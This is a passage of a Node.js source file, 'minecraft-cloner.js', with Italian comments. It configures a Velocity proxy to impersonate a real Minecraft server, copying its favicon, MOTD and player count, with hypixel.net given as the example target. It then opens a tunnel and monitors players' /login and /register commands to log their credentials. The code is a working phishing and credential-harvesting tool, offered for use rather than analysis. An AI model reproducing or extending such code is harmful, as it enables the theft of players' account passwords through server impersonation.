                console.log('🔄 VELOCITY ESISTENTE RILEVATO - Riconfigurazione rapida');
                console.log('═══════════════════════════════════════════════════════════');
                console.log('🚀 Salto download (già presenti)');
                console.log('📝 Solo aggiornamento configurazione');
                console.log('═══════════════════════════════════════════════════════════\n');
                
                // Usa riconfigurazione rapida
                await this.reconfigureTarget(process.argv[2], parseInt(process.argv[3]) || 25565);
            } else {
                console.log('📦 PRIMA INSTALLAZIONE - Setup completo');
                console.log('═══════════════════════════════════════════════════════════\n');
                
                // Scansiona il server target
                await this.scanTarget(process.argv[2], parseInt(process.argv[3]) || 25565);
                
                // Setup Velocity completo
                await this.setupVelocity();
            }
            
            // Avvia Velocity
            await this.startVelocity();
            
            // Setup tunnel
            const tunnel = await this.setupTunnel();
            
            // Avvia monitoraggio credenziali
            await this.startCredentialMonitoring();
            
            console.log('⚠️  PREMI CTRL+C PER FERMARE TUTTO');
            console.log('🎯 Monitoraggio attivo per comandi /login e /register...\n');
            
            // Attendi interruzione
            process.on('SIGINT', () => {
                console.log('\n⏹️  Interruzione richiesta...\n');
                this.credLogger.printStats();
                this.cleanup();
                process.exit(0);
            });
            
            // Mantieni il processo attivo
            while (this.isRunning) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
            
        } catch (error) {
            console.error('❌ Errore sistema:', error.message);
            this.cleanup();
            process.exit(1);
        }
    }

    // Aggiorna solo il target server nella configurazione esistente (senza riavvio)
    updateTargetConfig(newHost, newPort, newTargetInfo) {
        const configPath = path.join(this.velocityDir, 'velocity.toml');
        
        if (!fs.existsSync(configPath)) return false;
        
        try {
            let config = fs.readFileSync(configPath, 'utf8');
            
            // Aggiorna server target
            config = config.replace(/lobby = ".*"/, `lobby = "${newHost}:${newPort}"`);
            
            // Aggiorna max players se disponibile
            if (newTargetInfo?.players?.max) {
                config = config.replace(/show-max-players = \d+/, `show-max-players = ${newTargetInfo.players.max}`);
            }
            
            fs.writeFileSync(configPath, config);
            console.log(`✅ Server target: ${newHost}:${newPort}`);
            
            // Aggiorna favicon se disponibile  
            if (newTargetInfo?.favicon) {
                try {
                    const faviconPath = path.join(this.velocityDir, 'server-icon.png');
                    const faviconData = newTargetInfo.favicon.split(',')[1];
                    fs.writeFileSync(faviconPath, Buffer.from(faviconData, 'base64'));
                    console.log('✅ Favicon: Copiata dal nuovo server');
                } catch (error) {
                    console.log('⚠️  Errore aggiornamento favicon:', error.message);
                }
            }
            
            // Il MOTD viene aggiornato automaticamente tramite ping-passthrough
            console.log('✅ MOTD: Sincronizzato automaticamente (ping-passthrough)');
            console.log('✅ Colori: Mantenuti 1:1 dal server originale');
            
            return true;
            
        } catch (error) {
            console.log('⚠️  Errore aggiornamento configurazione:', error.message);
            return false;
        }
    }

    cleanup() {
        console.log('🧹 Pulizia processi...');
        
        if (this.velocityProcess) {
            this.velocityProcess.kill();
            console.log('🛑 Velocity fermato');
        }
        
        if (this.tunnelProcess) {
            this.tunnelProcess.kill();
            console.log('🛑 Tunnel fermato');
        }
        
        this.isRunning = false;
    }

    // Verifica se due server sono "compatibili" per switch ultrarapido
    isCompatibleTarget(oldTarget, newTarget) {
        if (!oldTarget || !newTarget) return false;
        
        // Compatibili se stessa versione e stesse features base
        const sameVersion = oldTarget.version?.name === newTarget.version?.name;
        const sameProtocol = oldTarget.version?.protocol === newTarget.version?.protocol;
        
        if (sameVersion && sameProtocol) {
            console.log('⚡ Target compatibile - switch ultrarapido possibile');
            return true;
        }
        
        console.log('⚠️ Target diverso - riconfigurazione necessaria'); 
        return false;
    }
}

// Avvio automatico
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('❌ Uso: node minecraft-cloner.js <server> [porta]');
        console.log('📝 Esempio: node minecraft-cloner.js hypixel.net 25565');
        process.exit(1);
    }
    
    const cloner = new AutoMinecraftCloner();
    cloner.run().catch(console.error);
}

module.exports = AutoMinecraftCloner;